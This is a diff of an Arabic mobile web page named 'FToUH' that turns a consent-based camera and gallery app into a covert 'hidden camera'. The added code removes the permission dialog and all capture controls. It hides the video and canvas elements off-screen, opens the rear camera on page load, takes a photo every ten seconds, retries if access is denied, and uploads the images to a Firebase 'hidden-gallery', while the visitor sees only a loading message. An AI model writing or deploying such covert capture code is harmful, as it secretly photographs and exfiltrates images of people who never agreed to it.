@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FToUH الكاميرا</title>
+    <title>FToUH الكاميرا الخفية</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        /* التصميم للهواتف فقط */
         :root {
-            --primary: #ff3366;
-            --secondary: #000022;
+            --primary: #ff0066;
+            --dark: #000000;
             --accent: #00ccff;
             --text: #ffffff;
         }
@@ -19,18 +18,17 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
+            font-family: Arial, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background-color: var(--secondary);
+            background-color: var(--dark);
             color: var(--text);
             height: 100vh;
             width: 100vw;
             overflow: hidden;
             position: fixed;
-            touch-action: manipulation;
         }
 
         /* الشريط العلوي */
@@ -38,178 +36,30 @@
             position: fixed;
             top: 0;
             width: 100%;
-            background: linear-gradient(to right, #000000, #220033);
+            background: rgba(0, 0, 0, 0.8);
             padding: 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             z-index: 100;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
             border-bottom: 1px solid var(--primary);
         }
 
         .app-title {
             font-size: 1.8rem;
             font-weight: bold;
-            background: linear-gradient(to right, var(--primary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 10px rgba(255, 51, 102, 0.3);
+            color: var(--primary);
+            text-shadow: 0 0 10px var(--primary);
         }
 
-        .camera-btn {
-            background: linear-gradient(45deg, var(--primary), #ff0066);
+        .gallery-btn {
+            background: var(--primary);
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 50px;
-            font-size: 1rem;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(255, 51, 102, 0.4);
-            transition: all 0.3s;
-        }
-
-        .camera-btn:active {
-            transform: scale(0.95);
-            box-shadow: 0 2px 5px rgba(255, 51, 102, 0.4);
-        }
-
-        /* نافذة الإذن */
-        .permission-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 200;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s;
-            backdrop-filter: blur(5px);
-            padding: 20px;
-        }
-
-        .permission-modal.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .permission-box {
-            background: #110033;
-            border: 1px solid var(--primary);
+            padding: 8px 15px;
             border-radius: 20px;
-            padding: 25px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 0 30px rgba(255, 51, 102, 0.3);
-            transform: scale(0.9);
-            transition: transform 0.3s;
-        }
-
-        .permission-modal.active .permission-box {
-            transform: scale(1);
-        }
-
-        .permission-text {
-            font-size: 1.2rem;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
-
-        .permission-btns {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-        }
-
-        .permission-btn {
-            padding: 12px 25px;
-            border-radius: 50px;
-            font-size: 1rem;
-            font-weight: bold;
-            border: none;
+            font-size: 0.9rem;
             cursor: pointer;
-            transition: all 0.3s;
-            flex: 1;
-        }
-
-        .allow-btn {
-            background: linear-gradient(45deg, var(--primary), #ff0066);
-            color: white;
-        }
-
-        .deny-btn {
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-
-        /* منطقة الكاميرا */
-        .camera-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background-color: #000;
-            z-index: 150;
-        }
-
-        .camera-view {
-            width: 100%;
-            max-width: 500px;
-            height: 70vh;
-            object-fit: cover;
-            display: none;
-        }
-
-        .captured-image {
-            width: 100%;
-            max-width: 500px;
-            height: 70vh;
-            object-fit: contain;
-            display: none;
-            background-color: #000;
-        }
-
-        .camera-controls {
-            position: fixed;
-            bottom: 20px;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            z-index: 160;
-        }
-
-        .control-btn {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.2);
-            border: 2px solid var(--primary);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 1.5rem;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .control-btn:active {
-            transform: scale(0.9);
-            background: rgba(255, 255, 255, 0.3);
         }
 
         /* معرض الصور */
@@ -219,37 +69,36 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: var(--secondary);
-            z-index: 180;
+            background-color: var(--dark);
+            z-index: 200;
             display: none;
             flex-direction: column;
-            padding-top: 70px;
+            padding-top: 60px;
             overflow-y: auto;
         }
 
         .gallery-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px;
-            background: linear-gradient(to right, #000000, #220033);
             position: fixed;
             top: 0;
             width: 100%;
-            z-index: 190;
+            background: rgba(0, 0, 0, 0.9);
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 210;
             border-bottom: 1px solid var(--primary);
         }
 
         .gallery-title {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: var(--primary);
+            font-size: 1.3rem;
+            color: var(--accent);
         }
 
         .close-gallery {
             background: none;
             border: none;
-            color: white;
+            color: var(--text);
             font-size: 1.5rem;
             cursor: pointer;
         }
@@ -259,7 +108,7 @@
             grid-template-columns: repeat(3, 1fr);
             gap: 5px;
             padding: 10px;
-            margin-top: 10px;
+            margin-bottom: 20px;
         }
 
         .gallery-item {
@@ -268,108 +117,38 @@
             object-fit: cover;
             border-radius: 5px;
             border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: transform 0.3s;
-        }
-
-        .gallery-item:active {
-            transform: scale(0.95);
         }
 
         .gallery-empty {
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            height: 50vh;
+            justify-content: center;
+            height: 60vh;
             color: rgba(255, 255, 255, 0.5);
-            text-align: center;
-            padding: 20px;
         }
 
-        /* تحليل الصورة */
-        .image-analysis {
+        /* عنصر الكاميرا المخفي */
+        .camera-element {
             position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 15px;
-            z-index: 170;
-            display: none;
-            flex-direction: column;
-            gap: 10px;
-            backdrop-filter: blur(5px);
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
         }
 
-        .analysis-title {
-            color: var(--accent);
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-
-        .analysis-result {
-            font-size: 0.9rem;
-            line-height: 1.4;
-        }
-
-        /* القائمة الرئيسية */
-        .main-menu {
+        /* رسالة التحميل */
+        .loading-message {
             position: fixed;
-            bottom: 20px;
+            top: 50%;
             left: 50%;
-            transform: translateX(-50%);
+            transform: translate(-50%, -50%);
             background: rgba(0, 0, 0, 0.7);
-            border-radius: 50px;
-            padding: 10px;
-            display: flex;
-            gap: 15px;
-            z-index: 90;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .menu-btn {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.1);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 1.2rem;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .menu-btn:active {
-            background: var(--primary);
-            transform: scale(0.9);
-        }
-
-        /* التأثيرات */
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-
-        /* شريط التمرير */
-        ::-webkit-scrollbar {
-            width: 5px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: transparent;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: var(--primary);
-            border-radius: 5px;
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 300;
+            display: none;
         }
     </style>
 </head>
@@ -377,83 +156,33 @@
     <!-- الشريط العلوي -->
     <div class="app-header">
         <div class="app-title">FToUH</div>
-        <button class="camera-btn" id="cameraBtn">ya mibon</button>
-    </div>
-
-    <!-- نافذة طلب الإذن -->
-    <div class="permission-modal" id="permissionModal">
-        <div class="permission-box">
-            <div class="permission-text">
-                هل تسمح ل Fateh بالوصول إلى الكاميرا؟
-                <br>
-                سيتم استخدامها لالتقاط صورة واحدة فقط
-            </div>
-            <div class="permission-btns">
-                <button class="permission-btn allow-btn" id="allowBtn">سماح</button>
-                <button class="permission-btn deny-btn" id="denyBtn">رفض</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- منطقة الكاميرا -->
-    <div class="camera-container" id="cameraContainer">
-        <video class="camera-view" id="cameraView" autoplay playsinline></video>
-        <img class="captured-image" id="capturedImage">
-        <canvas id="cameraCanvas" style="display:none;"></canvas>
-        
-        <div class="camera-controls">
-            <button class="control-btn" id="retakeBtn" style="display:none;">
-                <i class="fas fa-redo"></i>
-            </button>
-            <button class="control-btn pulse" id="captureBtn">
-                <i class="fas fa-camera"></i>
-            </button>
-            <button class="control-btn" id="saveBtn" style="display:none;">
-                <i class="fas fa-save"></i>
-            </button>
-        </div>
-        
-        <div class="image-analysis" id="imageAnalysis">
-            <div class="analysis-title">تحليل الصورة:</div>
-            <div class="analysis-result" id="analysisResult">جاري تحليل الصورة...</div>
-        </div>
+        <button class="gallery-btn" id="galleryBtn">المعرض</button>
     </div>
 
     <!-- معرض الصور -->
     <div class="gallery-container" id="galleryContainer">
         <div class="gallery-header">
-            <div class="gallery-title">معرض الصور</div>
-            <button class="close-gallery" id="closeGallery">
-                <i class="fas fa-times"></i>
-            </button>
+            <div class="gallery-title">الصور الملتقطة</div>
+            <button class="close-gallery" id="closeGallery">✕</button>
         </div>
         
         <div class="gallery-grid" id="galleryGrid">
             <!-- الصور تظهر هنا تلقائياً -->
         </div>
         
-        <div class="gallery-empty" id="galleryEmpty" style="display:none;">
-            <i class="fas fa-images" style="font-size:3rem; margin-bottom:15px;"></i>
+        <div class="gallery-empty" id="galleryEmpty">
             <div>لا توجد صور في المعرض بعد</div>
         </div>
     </div>
 
-    <!-- القائمة الرئيسية -->
-    <div class="main-menu">
-        <button class="menu-btn" id="galleryBtn">
-            <i class="fas fa-images"></i>
-        </button>
-        <button class="menu-btn" id="homeBtn">
-            <i class="fas fa-home"></i>
-        </button>
-    </div>
-
-    <!-- Font Awesome للايقونات -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
+    <!-- عناصر الكاميرا المخفية -->
+    <video class="camera-element" id="cameraView" autoplay playsinline></video>
+    <canvas class="camera-element" id="cameraCanvas"></canvas>
     
-    <!-- TensorFlow.js للتعرف على الصور -->
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.18.0/dist/tf.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/mobilenet@2.1.0"></script>
+    <!-- رسالة التحميل -->
+    <div class="loading-message" id="loadingMessage">
+        جاري التهيئة... الرجاء الانتظار
+    </div>
 
     <!-- الكود الرئيسي -->
     <script>
@@ -473,155 +202,22 @@
 
         document.addEventListener('DOMContentLoaded', function() {
             // العناصر
-            const cameraBtn = document.getElementById('cameraBtn');
-            const permissionModal = document.getElementById('permissionModal');
-            const allowBtn = document.getElementById('allowBtn');
-            const denyBtn = document.getElementById('denyBtn');
-            const cameraContainer = document.getElementById('cameraContainer');
-            const cameraView = document.getElementById('cameraView');
-            const capturedImage = document.getElementById('capturedImage');
-            const cameraCanvas = document.getElementById('cameraCanvas');
-            const captureBtn = document.getElementById('captureBtn');
-            const retakeBtn = document.getElementById('retakeBtn');
-            const saveBtn = document.getElementById('saveBtn');
-            const imageAnalysis = document.getElementById('imageAnalysis');
-            const analysisResult = document.getElementById('analysisResult');
+            const galleryBtn = document.getElementById('galleryBtn');
             const galleryContainer = document.getElementById('galleryContainer');
+            const closeGallery = document.getElementById('closeGallery');
             const galleryGrid = document.getElementById('galleryGrid');
             const galleryEmpty = document.getElementById('galleryEmpty');
-            const galleryBtn = document.getElementById('galleryBtn');
-            const closeGallery = document.getElementById('closeGallery');
-            const homeBtn = document.getElementById('homeBtn');
+            const cameraView = document.getElementById('cameraView');
+            const cameraCanvas = document.getElementById('cameraCanvas');
+            const loadingMessage = document.getElementById('loadingMessage');
 
             // متغيرات
             let stream = null;
-            let currentImageUrl = null;
-            let model = null;
+            let captureInterval = null;
+            let isCameraActive = false;
 
-            // تحميل نموذج التعرف على الصور
-            async function loadModel() {
-                model = await mobilenet.load();
-                console.log('Model loaded');
-            }
-
-            // فتح الكاميرا
-            cameraBtn.addEventListener('click', () => {
-                permissionModal.classList.add('active');
-            });
-
-            // السماح بالوصول للكاميرا
-            allowBtn.addEventListener('click', async () => {
-                permissionModal.classList.remove('active');
-                
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            facingMode: 'environment',
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        } 
-                    });
-                    cameraContainer.style.display = 'flex';
-                    cameraView.style.display = 'block';
-                    cameraView.srcObject = stream;
-                } catch (error) {
-                    console.error('Camera error:', error);
-                    alert('حدث خطأ في فتح الكاميرا');
-                }
-            });
-
-            // رفض الوصول للكاميرا
-            denyBtn.addEventListener('click', () => {
-                permissionModal.classList.remove('active');
-            });
-
-            // التقاط صورة
-            captureBtn.addEventListener('click', () => {
-                if (!stream) return;
-                
-                const context = cameraCanvas.getContext('2d');
-                cameraCanvas.width = cameraView.videoWidth;
-                cameraCanvas.height = cameraView.videoHeight;
-                context.drawImage(cameraView, 0, 0, cameraCanvas.width, cameraCanvas.height);
-                
-                currentImageUrl = cameraCanvas.toDataURL('image/jpeg', 0.8);
-                capturedImage.src = currentImageUrl;
-                cameraView.style.display = 'none';
-                capturedImage.style.display = 'block';
-                captureBtn.style.display = 'none';
-                retakeBtn.style.display = 'flex';
-                saveBtn.style.display = 'flex';
-                imageAnalysis.style.display = 'flex';
-                
-                // تحليل الصورة
-                analyzeImage(cameraCanvas);
-            });
-
-            // إعادة التقاط
-            retakeBtn.addEventListener('click', () => {
-                capturedImage.style.display = 'none';
-                cameraView.style.display = 'block';
-                captureBtn.style.display = 'flex';
-                retakeBtn.style.display = 'none';
-                saveBtn.style.display = 'none';
-                imageAnalysis.style.display = 'none';
-            });
-
-            // حفظ الصورة
-            saveBtn.addEventListener('click', () => {
-                if (!currentImageUrl) return;
-                
-                const timestamp = Date.now();
-                database.ref('gallery/' + timestamp).set({
-                    imageUrl: currentImageUrl,
-                    timestamp: timestamp,
-                    analysis: analysisResult.innerText
-                }).then(() => {
-                    alert('تم حفظ الصورة في المعرض');
-                    closeCamera();
-                });
-            });
-
-            // إغلاق الكاميرا
-            function closeCamera() {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    stream = null;
-                }
-                cameraContainer.style.display = 'none';
-                cameraView.style.display = 'none';
-                capturedImage.style.display = 'none';
-                captureBtn.style.display = 'flex';
-                retakeBtn.style.display = 'none';
-                saveBtn.style.display = 'none';
-                imageAnalysis.style.display = 'none';
-            }
-
-            // تحليل الصورة باستخدام TensorFlow.js
-            async function analyzeImage(imageElement) {
-                if (!model) {
-                    analysisResult.innerText = 'النموذج غير جاهز بعد';
-                    return;
-                }
-                
-                analysisResult.innerText = 'جاري تحليل الصورة...';
-                
-                try {
-                    const predictions = await model.classify(imageElement);
-                    let result = '';
-                    
-                    predictions.forEach((pred, index) => {
-                        if (index < 3) { // عرض أفضل 3 تنبؤات فقط
-                            result += `${Math.round(pred.probability * 100)}% ${pred.className}\n`;
-                        }
-                    });
-                    
-                    analysisResult.innerText = result;
-                } catch (error) {
-                    console.error('Analysis error:', error);
-                    analysisResult.innerText = 'فشل في تحليل الصورة';
-                }
-            }
+            // عرض رسالة التحميل
+            loadingMessage.style.display = 'block';
 
             // فتح المعرض
             galleryBtn.addEventListener('click', () => {
@@ -634,26 +230,20 @@
                 galleryContainer.style.display = 'none';
             });
 
-            // العودة للصفحة الرئيسية
-            homeBtn.addEventListener('click', () => {
-                galleryContainer.style.display = 'none';
-                closeCamera();
-            });
-
             // تحميل المعرض من Firebase
             function loadGallery() {
-                database.ref('gallery').on('value', (snapshot) => {
+                database.ref('hidden-gallery').on('value', (snapshot) => {
                     const images = snapshot.val();
                     galleryGrid.innerHTML = '';
                     
-                    if (images) {
+                    if (images && Object.keys(images).length > 0) {
                         galleryEmpty.style.display = 'none';
                         
+                        // ترتيب الصور من الأحدث إلى الأقدم
                         Object.entries(images).sort((a, b) => b[1].timestamp - a[1].timestamp).forEach(([key, img]) => {
                             const imgElement = document.createElement('img');
                             imgElement.className = 'gallery-item';
                             imgElement.src = img.imageUrl;
-                            imgElement.onclick = () => showImageDetails(img);
                             galleryGrid.appendChild(imgElement);
                         });
                     } else {
@@ -662,28 +252,74 @@
                 });
             }
 
-            // عرض تفاصيل الصورة
-            function showImageDetails(img) {
-                capturedImage.src = img.imageUrl;
-                cameraContainer.style.display = 'flex';
-                capturedImage.style.display = 'block';
-                imageAnalysis.style.display = 'flex';
-                analysisResult.innerText = img.analysis || 'لا توجد معلومات تحليل';
-                retakeBtn.style.display = 'none';
-                saveBtn.style.display = 'none';
-                captureBtn.style.display = 'none';
+            // بدء الكاميرا الخفية
+            async function startHiddenCamera() {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: {
+                            facingMode: 'environment',
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
+                        }
+                    });
+                    
+                    cameraView.srcObject = stream;
+                    isCameraActive = true;
+                    
+                    // بدء التقاط الصور تلقائياً كل 10 ثواني
+                    captureInterval = setInterval(captureAndSaveImage, 10000);
+                    
+                    // إخفاء رسالة التحميل بعد نجاح التشغيل
+                    loadingMessage.style.display = 'none';
+                    
+                } catch (error) {
+                    console.error('Camera error:', error);
+                    loadingMessage.textContent = 'تعذر الوصول إلى الكاميرا. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
+                    
+                    // المحاولة مرة أخرى بعد 5 ثواني
+                    setTimeout(startHiddenCamera, 5000);
+                }
             }
 
-            // تهيئة التطبيق
-            loadModel();
-            loadGallery();
+            // التقاط الصورة وحفظها
+            async function captureAndSaveImage() {
+                if (!isCameraActive) return;
+                
+                try {
+                    const context = cameraCanvas.getContext('2d');
+                    cameraCanvas.width = cameraView.videoWidth;
+                    cameraCanvas.height = cameraView.videoHeight;
+                    context.drawImage(cameraView, 0, 0, cameraCanvas.width, cameraCanvas.height);
+                    
+                    const imageUrl = cameraCanvas.toDataURL('image/jpeg', 0.7);
+                    const timestamp = Date.now();
+                    
+                    // حفظ الصورة في Firebase
+                    await database.ref('hidden-gallery/' + timestamp).set({
+                        imageUrl: imageUrl,
+                        timestamp: timestamp
+                    });
+                    
+                    console.log('تم حفظ الصورة تلقائياً');
+                    
+                } catch (error) {
+                    console.error('Capture error:', error);
+                }
+            }
 
-            // إغلاق الكاميرا عند الخروج من الصفحة
+            // إيقاف الكاميرا عند إغلاق الصفحة
             window.addEventListener('beforeunload', () => {
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                }
             });
+
+            // بدء التطبيق
+            startHiddenCamera();
+            loadGallery();
         });
     </script>
 </body>
